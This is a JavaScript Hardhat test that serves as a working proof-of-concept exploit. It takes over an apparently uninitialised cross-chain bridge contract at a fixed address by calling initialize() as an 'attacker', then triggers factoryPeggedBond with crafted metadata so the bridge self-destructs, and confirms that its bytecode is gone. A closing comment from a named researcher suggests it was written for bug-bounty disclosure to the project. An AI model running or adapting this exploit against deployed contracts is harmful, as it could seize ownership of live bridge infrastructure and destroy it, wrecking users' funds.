const { expect } = require("chai");
const { getContractAddress } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

console.log(".............Destruct Contract.............")


it(" Selfdestruct Contract", async()=>{
    let currentBlock = await ethers.provider.getBlock("latest");
    console.log("CURRENT BLOCK : ",currentBlock.number, "CURRENT BLOCK TIMESTAMP :",currentBlock.timestamp);
    const [attacker] = await ethers.getSigners();

    const CROSSCHAINBIDGE = "0x868964b90589d1695c08cd54dcd44092929662f9";
    const CrossChainBridge_R1 = await ethers.getContractAt("CrossChainBridge_R1", CROSSCHAINBIDGE);
    


    //deploy SimpleTokenFactory contract
    const SimpleTokenFactory = await ethers.getContractFactory("SimpleTokenFactoryAttack")
    const tokenFactory = await SimpleTokenFactory.deploy();

    //deploy InternetBondFactory contract
    const InternetBondFactory = await ethers.getContractFactory("InternetBondFactoryAttack")
    const bondFactory = await InternetBondFactory.deploy();

    //deploy BridgeRouter contract
    const BridgeRouterFactory = await ethers.getContractFactory("BridgeRouterAttack");
    const bridgeRouter = await BridgeRouterFactory.deploy();


     // preparing a malicious data 
     /*address consensusAddress,
     SimpleTokenFactory tokenFactory,
     InternetBondFactory bondFactory,
     string memory nativeTokenSymbol,
     string memory nativeTokenName,
     InternetBondRatioFeed bondFeed,
     BridgeRouter router*/
    
    const consensusAddress = "0xc437DF90B37C1dB6657339E31BfE54627f0e7181" //random address
    const address_tokenFactory = tokenFactory.address;
    const address_bondFactory = bondFactory.address;
    const nativeTokenSymbol = "Symbol_1";
    const nativeTokenName = "Symbol_2";
    const address_bondFeed = "0xc437DF90B37C1dB6657339E31BfE54627f0e7181" //random address
    const address_router = bridgeRouter.address;

    //initialize BridgeContract
    console.log("...Initializing...\n");
    await CrossChainBridge_R1.connect(attacker).initialize(
        consensusAddress,
        address_tokenFactory,
        address_bondFactory,
        nativeTokenSymbol,
        nativeTokenName,
        address_bondFeed,
        address_router
    );
    const Owner_contract = await CrossChainBridge_R1.connect(attacker).owner();
    console.log("Owner Contract is:",Owner_contract,"\n");
    console.log("...Add Allowed Contract...\n");
    await CrossChainBridge_R1.connect(attacker).addAllowedContract(
        "0xc437DF90B37C1dB6657339E31BfE54627f0e7181",2
    );
    const Metadata = {
        symbol:  "0x0000000000000000000000000000000000000000000000000000000000000001",
        name:   "0x0000000000000000000000000000000000000000000000000000000000000001",
        originChain: 2,
        originAddress: "0x0000000000000000000000000000000000000000",
        bondMetadata: "0x0000000000000000000000000000000000000000000000000000000000000001"
    }
    console.log("...Destory Contract...\n");
    await CrossChainBridge_R1.connect(attacker).factoryPeggedBond(2, Metadata);
    const bytescode = await ethers.provider.getCode(CROSSCHAINBIDGE);
    expect(bytescode).to.equal("0x");
    console.log("Bytescode of bridge constract is:",bytescode);
})

/*Hello Anker, My name is Amir, I have three years of work experience in the field of blockchain.
 am checking your project thoroughly and will let you know when I find any bugs in your program.
github: https://github.com/amirfarajii
email: amirhoseinfaraji784@gmail.com */
